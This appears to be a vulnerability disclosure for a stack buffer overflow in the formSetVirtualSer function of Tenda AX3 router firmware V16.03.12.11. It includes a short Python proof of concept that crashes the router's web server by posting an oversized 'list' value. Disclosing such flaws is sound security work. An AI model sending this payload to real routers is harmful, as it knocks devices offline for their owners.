Information
===========

**Vendor of the products**: Tenda <br>

**Vendor's website**: https://www.tenda.com.cn <br>

**Reported by**: korey0sh1(korey0sh2@gmail.com) <br>

**Affected products**: Tenda AX3 <br>

**Affected firmware version**: V16.03.12.11 <br>

**Firmware download address**: https://www.tenda.com.cn/download/detail-3476.html <br>

Overview
===========

**Tenda AX3 V16.03.12.11** has a **stack buffer overflow** vulnerability detected at function **formSetVirtualSer**. This vulnerability allows attackers to cause a Denial of Service (DoS) via the **list** parameter . <br>

Vulnerability details
=====================
The vulnerability is detected at **/bin/httpd** <br>

In the function **formSetVirtualSer**, the content obtained by program through parameter **list** given by http is passed to variable **v4**. Variable **v4** enters the function **save_virtualser_data** as a parameter, and a stack overflow vulnerability exists within **save_virtualser_data** <br>
![](https://github.com/Korey0sh1/IoT_vuln/blob/main/Tenda/AX3/img/22.png) <br>
![](https://github.com/Korey0sh1/IoT_vuln/blob/main/Tenda/AX3/img/23.png) <br>
<br>

Proof of Code
====================
```python
from pwn import *
import requests

url = "http://192.168.0.1/goform/SetVirtualServerCfg"

payload = "a"*0x1000
data = {
    "list": payload,
}
res = requests.post(url=url,data=data)
print(res.text)
```

Attack Demo
========
![](https://github.com/Korey0sh1/IoT_vuln/blob/main/Tenda/AX3/img/24.png)
![](https://github.com/Korey0sh1/IoT_vuln/blob/main/Tenda/AX3/img/25.png)
![](https://github.com/Korey0sh1/IoT_vuln/blob/main/Tenda/AX3/img/26.png)
